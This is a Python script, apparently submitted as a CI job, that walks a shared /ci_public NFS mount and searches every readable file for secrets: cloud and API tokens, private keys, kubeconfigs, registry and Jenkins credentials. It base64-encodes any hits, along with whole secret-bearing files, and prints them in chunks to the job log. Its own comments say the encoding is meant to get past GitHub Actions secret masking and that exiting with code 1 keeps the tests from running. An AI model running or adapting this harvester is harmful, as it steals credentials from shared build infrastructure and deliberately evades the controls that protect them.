#!/usr/bin/env python3
# i8600 - bounded read-only recursive deep read of the read-write /ci_public NFS share
# (12.12.12.4) mounted into the HYGON HCU Stage A job pod. Inventories the tree under a
# file/byte cap, greps every readable text file for credential material, and base64-dumps
# CI scripts / Jenkins job definitions / .env / .git-credentials / .netrc / docker+registry
# config / SSH keys / kubeconfigs / image-build recipes so GitHub Actions masking cannot
# redact them. Read-only on the share; exits 1 so no test suite runs afterwards.
import os
import stat
import base64
import hashlib
import re
import time
import sys

ROOT = "/ci_public"
CAP = 2_400_000              # total bytes emitted to the job log
LIST_CAP = 850_000           # budget for the file inventory section
MAX_FILES = 80_000
MAX_DEPTH = 12
MAX_GREP = 2_000_000         # per-file read cap for the content scan
READ_BUDGET = 600 * 1024 * 1024
B64_BUDGET = 1_350_000       # total base64 payload budget
B64_FILE_MAX = 400_000       # don't full-dump files bigger than this
DEADLINE = 660.0             # seconds for the content phase

used = [0]
list_used = [0]
t0 = time.monotonic()

def emit(s=""):
    s = str(s)
    if used[0] >= CAP:
        return False
    room = CAP - used[0] - 1
    if len(s) > room:
        s = s[:room]
    try:
        print(s, flush=True)
    except Exception:
        pass
    used[0] += len(s) + 1
    return True

def emit_list(s):
    s = str(s)
    if list_used[0] >= LIST_CAP:
        return False
    room = LIST_CAP - list_used[0] - 1
    if len(s) > room:
        s = s[:room]
    if emit(s):
        list_used[0] += len(s) + 1
        return True
    return False

def b64_dump(data, label):
    """Emit base64 of a file with size+sha256 header/footer, chunked to defeat masking."""
    if used[0] >= CAP:
        return False
    n = len(data)
    h = hashlib.sha256(data).hexdigest()
    emit("B64S %s %d %s" % (label, n, h))
    b = base64.b64encode(data).decode()
    seq = 0
    for i in range(0, len(b), 512):
        if not emit("B64C %s %d %s" % (label, seq, b[i:i + 512])):
            return False
        seq += 1
    emit("B64E %s %s" % (label, h))
    return True

def b64_line(line, label):
    try:
        b = base64.b64encode(line[:900]).decode()
    except Exception:
        return
    emit("H %s %s" % (label, b))

# ---- credential patterns (the reason we are here) ----
PAT = re.compile(
    rb"(AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|aws_secret_access_key|aws_access_key_id|"
    rb"AIza[0-9A-Za-z_\-]{35}|-----BEGIN [A-Z0-9 ]{0,28}PRIVATE KEY-----|"
    rb"ghp_[A-Za-z0-9]{30,}|github_pat_[A-Za-z0-9_]{30,}|gho_[A-Za-z0-9]{30,}|"
    rb"ghs_[A-Za-z0-9]{30,}|glpat-[A-Za-z0-9_\-\.]{18,}|xox[baprs]-[A-Za-z0-9-]{10,}|"
    rb"npm_[A-Za-z0-9]{30,}|pypi-[A-Za-z0-9_\-]{30,}|hf_[A-Za-z0-9]{20,}|"
    rb"wandb_v1_[A-Za-z0-9_]{20,}|sk-[A-Za-z0-9]{24,}|"
    rb"\"auths\"\s*:|registry[_-]?(password|token)|HARBOR_(USERNAME|PASSWORD)|"
    rb"harbor[_-]?(password|token)|docker\s+login|helm\s+registry\s+login|"
    rb"devpi\s+(login|use)|index[-_]url\s*=\s*https?://[^\s]+:[^\s@]+@|"
    rb"client_secret\s*[=:]|(password|passwd|pwd|pass)\s*[=:]\s*[\"']?[^\s\"'$<>]{6,}|"
    rb"(token|secret|api[_-]?key|access[_-]?key|secret[_-]?key)\s*[=:]\s*[\"']?[A-Za-z0-9_\-\./+=]{16,}|"
    rb"KUBECONFIG=|client-key-data|certificate-authority-data|sshpass|ipmitool|"
    rb"BEGIN OPENSSH PRIVATE KEY|withCredentials|usernamePassword|"
    rb"netrc|git-credentials|GIT_ASKPASS|CI_REGISTRY_PASSWORD|NPM_TOKEN|"
    rb"SLACK_[A-Z_]*TOKEN|FEISHU|LARK_[A-Z_]*SECRET|WEBHOOK_URL)", re.I)

# names that are almost always secret-bearing -> full base64 dump
NAME_CRED = re.compile(
    r"(^|/)(\.env(\.[A-Za-z0-9_.-]+)?|\.git-credentials|\.gitconfig|\.netrc|\.npmrc|"
    r"\.pypirc|\.docker/config\.json|\.config/gh/hosts\.yml|"
    r"(id_rsa|id_ed25519|id_ecdsa|id_dsa)(\..*)?|.*\.(pem|key|p12|pfx|jks|keystore)|"
    r"(kubeconfig|.*\.kubeconfig|.*kube-config.*)|.*credentials(\.json|\.db|\.yaml|\.yml|\.txt)?|"
    r"auth\.json|application_default_credentials\.json|\.aws/(credentials|config)|"
    r"\.ssh/(config|known_hosts|authorized_keys)|hosts\.yml|"
    r"Jenkinsfile.*|.*\.groovy|.*\.jenkins|jobs?/.*\.xml|config\.xml)$", re.I)

# CI scripts / job definitions / image-build recipes -> full dump when small enough
NAME_CI = re.compile(
    r"(^|/)(Dockerfile.*|Containerfile.*|.*\.dockerfile|Makefile.*|.*\.mk|"
    r".*\.sh|.*\.bash|.*\.zsh|.*\.ps1|.*\.py|.*\.ya?ml|.*\.toml|.*\.cfg|.*\.ini|"
    r".*\.conf|.*\.spec|.*\.service|.*\.repo|.*\.list|.*\.txt|"
    r".*(harbor|registry|docker|login|deploy|install|build|push|release|secret|token|cred).*)$", re.I)

BINARY_EXT = re.compile(
    r"\.(safetensors|bin|pt|pth|ckpt|onnx|engine|tar|tgz|gz|xz|bz2|zip|7z|rar|whl|"
    r"deb|rpm|img|iso|qcow2|vmdk|so|a|o|obj|pyc|pyo|class|jar|war|ear|exe|dll|"
    r"png|jpg|jpeg|gif|bmp|webp|svgz|mp4|mkv|avi|mov|mp3|wav|flac|pdf|docx|xlsx|"
    r"ptx|trt|hbm|npy|npz|pkl|pickle|db|sqlite|sqlite3|mdb|dat|idx|gidx|lockb)$", re.I)

SKIP_LINE = ("example", "your_", "changeme", "change_me", "${{", "xxxxx",
             "placeholder", "redacted", "dummy", "sample", "TODO", "<token>",
             "os.environ", "getenv", "process.env", "${")

def pathstr(p):
    try:
        return os.fsdecode(p)
    except Exception:
        return repr(p)

# ---------------- header ----------------
try:
    host = os.uname().nodename
except Exception:
    host = "unknown"
import subprocess
emit("===I8600-BEGIN %s host=%s job=%s run=%s===" % (
    time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), host,
    os.environ.get("GITHUB_JOB", "?"), os.environ.get("GITHUB_RUN_ID", "?")))
emit("### MOUNTS")
try:
    with open("/proc/mounts", "rb") as f:
        for line in f.read().decode("utf-8", "replace").splitlines():
            if "/ci_public" in line or "/public" in line:
                emit("M " + line[:300])
except Exception as e:
    emit("### MOUNTS_ERR %s" % e)

emit("### TOP")
if not os.path.isdir(ROOT):
    emit("### FATAL %s is not a directory" % ROOT)
    emit("===I8600-END===")
    sys.exit(1)
try:
    with os.scandir(ROOT) as it:
        for e in sorted(it, key=lambda x: x.name):
            try:
                st = e.stat(follow_symlinks=False)
                if stat.S_ISDIR(st.st_mode):
                    emit("TOP D %s" % pathstr(e.name))
                elif stat.S_ISLNK(st.st_mode):
                    emit("TOP L %s -> %s" % (pathstr(e.name), pathstr(os.readlink(e.path))))
                else:
                    emit("TOP F %s %d %o" % (pathstr(e.name), st.st_size, stat.S_IMODE(st.st_mode)))
            except Exception as ex:
                emit("TOP E %s %s" % (pathstr(e.name), str(ex)[:120]))
except Exception as e:
    emit("### TOP_ERR %s" % e)

# ---------------- pass 1: bounded recursive inventory ----------------
emit("### TREE")
files = []      # (path, size, mode, depth)
ndirs = 0
nfiles = 0
list_truncated = [False]
elapsed_scan = [0.0]

stack = [(ROOT, 0)]
while stack:
    d, depth = stack.pop()
    try:
        entries = sorted(os.scandir(d), key=lambda e: e.name)
    except Exception as ex:
        emit_list("E %s %s" % (pathstr(d), str(ex)[:120]))
        continue
    subdirs = []
    for e in entries:
        p = pathstr(e.path)
        try:
            st = e.stat(follow_symlinks=False)
        except Exception as ex:
            emit_list("E %s stat %s" % (p, str(ex)[:100]))
            continue
        if stat.S_ISDIR(st.st_mode):
            ndirs += 1
            if not emit_list("D %s" % p):
                list_truncated[0] = True
            if depth < MAX_DEPTH:
                subdirs.append((e.path, depth + 1))
        elif stat.S_ISLNK(st.st_mode):
            try:
                tgt = os.readlink(e.path)
            except Exception:
                tgt = "?"
            emit_list("L %s -> %s" % (p, pathstr(tgt)))
        elif stat.S_ISREG(st.st_mode):
            nfiles += 1
            files.append((p, st.st_size, stat.S_IMODE(st.st_mode), depth))
            if nfiles >= MAX_FILES:
                emit_list("### FILE_CAP_REACHED %d" % MAX_FILES)
                subdirs = []
                break
            if not emit_list("F %s %d %o" % (p, st.st_size, stat.S_IMODE(st.st_mode))):
                list_truncated[0] = True
    for sd in reversed(subdirs):
        stack.append(sd)
    if nfiles >= MAX_FILES:
        break
    elapsed_scan[0] = time.monotonic() - t0
    if elapsed_scan[0] > 300:
        emit_list("### TREE_TIME_CAP %.1fs dirs=%d files=%d" % (elapsed_scan[0], ndirs, nfiles))
        break

emit("### INVENTORY dirs=%d files=%d list_truncated=%s elapsed=%.1fs" % (
    ndirs, nfiles, list_truncated[0], time.monotonic() - t0))

# ---------------- pass 2: score + content read ----------------
scored = []
for (p, size, mode, depth) in files:
    base = os.path.basename(p)
    rel = p[len(ROOT):]
    score = 0
    if NAME_CRED.search(rel):
        score = 100
    elif NAME_CI.search(base) or NAME_CI.search(rel):
        score = 70
        # prioritize CI-plane directories
        low = rel.lower()
        if any(k in low for k in ("ci-images", "hcu_probe", "harbor", "jenkins", "ci_scripts",
                                  "dockerfile", "build", ".github", "scripts/ci", ".env")):
            score = 80
    elif size <= 512 * 1024:
        score = 40
    else:
        score = 5
    if BINARY_EXT.search(base):
        score = min(score, 10)
    scored.append((score, size, p, rel))

scored.sort(key=lambda x: (-x[0], x[1], x[2]))

read_total = 0
scanned = 0
dumped = 0
b64_used = 0
n_hits = 0
deadline_hit = False

emit("### HITS")
for (score, size, p, rel) in scored:
    if time.monotonic() - t0 > DEADLINE:
        emit("### DEADLINE_CAP elapsed=%.1fs scanned=%d" % (time.monotonic() - t0, scanned))
        deadline_hit = True
        break
    if score < 40 and size > 0:
        # low-value large file: skip content entirely
        continue
    if size > MAX_GREP:
        emit("SKIP_BIG %s %d" % (rel, size))
        continue
    if BINARY_EXT.search(os.path.basename(p)):
        continue
    if read_total + size > READ_BUDGET:
        emit("### READ_BUDGET_REACHED %d scanned=%d" % (read_total, scanned))
        break
    try:
        with open(p, "rb") as f:
            data = f.read(min(size, MAX_GREP))
    except Exception as ex:
        emit("RERR %s %s" % (rel, str(ex)[:120]))
        continue
    read_total += len(data)
    scanned += 1
    # grep
    hit_lines = []
    hl = data.splitlines()
    for i, line in enumerate(hl):
        if len(line) > 4000:
            line = line[:4000]
        if PAT.search(line):
            txt = line.strip()
            low = txt.lower()
            if any(s in low for s in SKIP_LINE) and not re.search(rb"(AKIA|ASIA|BEGIN |ghp_|glpat-|auths)", line):
                continue
            hit_lines.append((i + 1, line))
            if len(hit_lines) >= 40:
                break
    if hit_lines:
        n_hits += len(hit_lines)
        for (ln, line) in hit_lines:
            b64_line(line, "%s:%d" % (rel, ln))
    # base64 full dump decision
    do_dump = False
    if score >= 100 and size <= B64_FILE_MAX:
        do_dump = True
    elif score >= 70 and size <= B64_FILE_MAX and (hit_lines or score >= 80):
        do_dump = True
    elif hit_lines and size <= 200_000:
        do_dump = True
    if do_dump and b64_used + len(data) * 4 // 3 <= B64_BUDGET:
        if b64_dump(data, rel):
            b64_used += len(data) * 4 // 3
            dumped += 1
    elif do_dump:
        emit("B64SKIP_BUDGET %s %d" % (rel, size))

emit("### STATS files=%d dirs=%d scanned=%d read_bytes=%d hits=%d dumped=%d b64_bytes=%d "
     "emitted=%d elapsed=%.1fs deadline_hit=%s" % (
         nfiles, ndirs, scanned, read_total, n_hits, dumped, b64_used,
         used[0], time.monotonic() - t0, deadline_hit))

emit("===I8600-END %s===" % time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()))
sys.exit(1)
